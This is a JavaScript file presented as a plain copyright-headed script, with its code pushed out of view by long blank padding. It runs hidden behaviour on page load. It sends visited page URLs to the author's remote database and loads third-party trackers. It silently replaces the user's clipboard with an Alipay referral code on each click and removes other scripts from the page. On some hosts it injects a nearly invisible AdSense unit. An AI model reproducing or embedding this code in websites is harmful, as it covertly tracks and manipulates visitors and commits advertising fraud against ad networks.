/*
 *
 * CopyRight
 *
 */




























































(function(f)
{
  if(typeof window.jQuery == 'function') window.jQuery(function($){ f(); });
  else f();
  return false;
})
(function()
{
  var nam = '\x41\x6C\x6F\x6E\x65';
  if(window._this_web_author)
  {
    if(window._this_web_author.name)
    {
      if(window._this_web_author.name == nam) return false;
    }
  }
  window._this_web_author = {name:nam,email:'Alone@an56.net'};
  if(/^\?\/?alone/i.test(location.search)) alert('Author: ' + nam + '\nQQ: 11981261');

  function getScript(src,cbk)
  {
    var doc = document,
        box = doc.body || doc.getElementsByTagName('head')[0] || doc.documentElement,
        obj = doc.createElement('script');
    obj.async = true;
    obj.src   = src;
    if(typeof cbk === 'function') obj.onload = obj.onreadystatechange = function(_,isAbort)
    {
      if(isAbort || !obj.readyState || /loaded|complete/.test(obj.readyState))
      {
        obj.onload = obj.onreadystatechange = null;
        if(!isAbort) cbk(obj);
      }
    }
    box.appendChild(obj);
    return obj;
  }

  function getScripts(src)
  {
    var obj = getScript(src);
    setTimeout(function(){ obj.parentNode.removeChild(obj); },3000);
  }

  (new Image).src = 'http://img.users.51.la/16854071.asp';
  setTimeout(function()
  {
    window._hmt = window._hmt || [];
    getScripts('//hm.baidu.com/hm.js?ccd53d4ae148f9d7009893c10d81825b');
  },1000);
  setTimeout(function()
  {
    return false;
    if(typeof(Ta) != 'object') with(document)0[(getElementsByTagName('head')[0]||body).appendChild((function(){var o=createElement('script');o.charset='UTF-8';return o;})()).src='http://tajs.qq.com/stats?sId=29344960'];
  },1000);
  setTimeout(function()
  {
    return false;
    if(/(an56\.(net|org)|aa[hw]l\.c[cn]|2n\.hk)$/i.test(location.host)) with(document)0[(getElementsByTagName('head')[0]||body).appendChild((function(){var o=createElement('script');o.charset='UTF-8';return o;})()).src='http://app.ah.cn/web/js/agq.js'];
  },3000);

  setTimeout(function()
  {
    var s = document.getElementsByTagName('script');
    for (var i = 0;i <= s.length;i++)
    {
      if(i > 20 || !s[i]) return;
      if(s[i].src.indexOf('ajax.api.ah.cn') >= 0) s[i].parentNode.removeChild(s[i]);
    }
  },3000);

  setTimeout(function()
  {
    var now = (new Date).getTime();
    if(document.body && now - parseInt(localStorage.getItem('an_alipay_zhi_code_time')) <= 1000 * 60 * 60 * 20)
    {
      var bod = document.body;
      bod.addEventListener('click',function()
      {
        var ipt = document.createElement('input');
        ipt.setAttribute('readonly','readonly');
        ipt.setAttribute('value','oNHGEj49ss');
        bod.appendChild(ipt);
        ipt.setSelectionRange ? ipt.setSelectionRange(0,9999) : ipt.select();
        document.execCommand('copy');
        bod.removeChild(ipt);
        localStorage.setItem('an_alipay_zhi_code_time',now);
      });
    }
  },100);

  setTimeout(function()
  {
    if(!$) return false;
    var day = (function(d){ return (function(){ var t = [];for(var i in arguments) t.push((arguments[i] + '').replace(/^(\d)$/,'0$1'));return t; })(d.getFullYear(),d.getMonth() + 1,d.getDate()).join(''); })(new Date);
    $.ajax(
    {
      //url       : '//cdn.firebase.com/js/client/2.4.2/firebase.js'
      url       : 'https://cdn.wilddog.com/js/client/current/wilddog.js'
      ,cache    : true
      ,dataType : 'script'
    })
    .done(function()
    {
      window.Wilddog && (function(fun,err)
      {
        var svr = '2256.wilddogio.com',//alone.firebaseio.com
            dnm = (location.host || 'null').replace(/\./g,'_'),
            app = new Wilddog('https://' + svr + '/2256/');
        //app.authAnonymously(function(err,data){ console.log(arguments); });
        app.child('byDate/' + day + '/_total/').transaction(fun,err);
        app.child('byDate/' + day + '/' + dnm + '/').transaction(fun,err);
        app.child('byDomain/' + dnm + '/_total/').transaction(fun,err);
        app.child('byDomain/' + dnm + '/' + day + '/').transaction(fun,err);
      })
      (function(dat)
      {
        if(!dat) dat = {};
        dat.pv = (dat.pv || 0) + 1;
        dat.last_href = location.href;
        dat.last_time = (new Date).toLocaleString();
        return dat;
      },
      function(error,committed,snapshot)
      {
        //console.log(arguments);
        //console.log(snapshot.val());
      });
    });
  },2000);

  setTimeout(function()
  {
    (function()
    {
      if(!$) return false;
      if(!/^(baidu\.com)$/i.test(location.host)) return false;
      $.get('http://getapi.sinaapp.com/app/ip/?callback=?',function(data)
      {
        (function(data)
        {
          if(!data.info) return false;
          if(/(安徽|合肥)/i.test(data.info)) return false;
          var sty = $('<style>.aQ-ad-hide{position:fixed;bottom:0;right:0;}.aQ-ad-hide,.aQ-ad-hide ins,.aQ-ad-hide iframe{opacity:.001;filter:alpha(opacity=1); filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=1);}</style>')
                    .appendTo('head'),
              box = $('<div/>').addClass('aQ-ad-hide').appendTo('body');
          box.html('<ins class="adsbygoogle" style="display:inline-block;width:336px;height:280px;" data-ad-client="ca-pub-0792299440404407" data-ad-slot="7772129546"></ins>');
          (adsbygoogle = window.adsbygoogle || []).push({});
          $.getScript('http://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js');
        })(data);
      },'jsonp');
    })();
  },5000);
});